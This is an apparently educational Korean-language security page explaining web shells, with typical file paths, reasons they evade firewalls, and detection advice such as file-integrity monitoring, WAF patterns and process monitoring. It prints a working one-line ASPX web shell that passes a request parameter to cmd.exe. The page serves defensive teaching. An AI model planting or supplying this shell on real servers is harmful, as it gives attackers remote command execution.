Web Shell

웹 서버에 악성 스크립트를 배치하여 원격 명령 실행

#1. Web Shell이란?

🌐 ➜ 📄 ➜ 🐚 ➜ 💥

"웹 요청으로 서버 명령을 실행하는 백도어"

Web Shell은 웹 서버에 업로드된 악성 스크립트(PHP, ASP, JSP 등)로, HTTP 요청을 통해 서버에서 임의의 명령을 실행할 수 있습니다. 정상적인 웹 트래픽 내에 숨겨져 방화벽을 우회합니다.

일반적인 Web Shell 위치

# IIS (ASP/ASPX)
C:\inetpub\wwwroot\uploads\shell.aspx
# Apache/Nginx (PHP)
/var/www/html/images/thumb.php

왜 위험한가?

방화벽 우회

HTTP/HTTPS 포트(80/443)를 통해 통신하므로 네트워크 방화벽을 우회합니다.

탐지 어려움

정상 웹 트래픽과 구별하기 어렵고 크기가 매우 작을 수 있습니다.

#2. 공격 기법 분석

ASPX Web Shell 예시

단 한 줄로 원격 명령 실행이 가능한 ASPX Web Shell입니다.

<!-- One-liner ASPX Web Shell -->
<%@ Page Language="C#" %>
<%= System.Diagnostics.Process.Start(
new System.Diagnostics.ProcessStartInfo("cmd.exe",
"/c " + Request["cmd"]) {
RedirectStandardOutput=true,
UseShellExecute=false
}).StandardOutput.ReadToEnd() %>

주요 Web Shell 유형

1.

One-liner Shell: 한 줄로 구성된 최소 크기 Web Shell (10~50 bytes)

2.

Full-featured Shell: 파일 관리, DB 접근, 리버스 셸 등 완전한 기능 제공 (China Chopper, B374K 등)

3.

Memory-only Shell: 디스크에 파일 없이 메모리에서만 동작하는 고급 Web Shell

탐지 및 방어 전략

🛡️

파일 무결성 감시: 웹 루트 디렉토리의 파일 변경/추가를 실시간 모니터링

🛡️

WAF(Web Application Firewall): 의심스러운 요청 패턴(cmd=, exec 등)을 필터링

🛡️

프로세스 모니터링: 웹 서버 프로세스(w3wp.exe, httpd)에서 cmd.exe 등 비정상 자식 프로세스 탐지
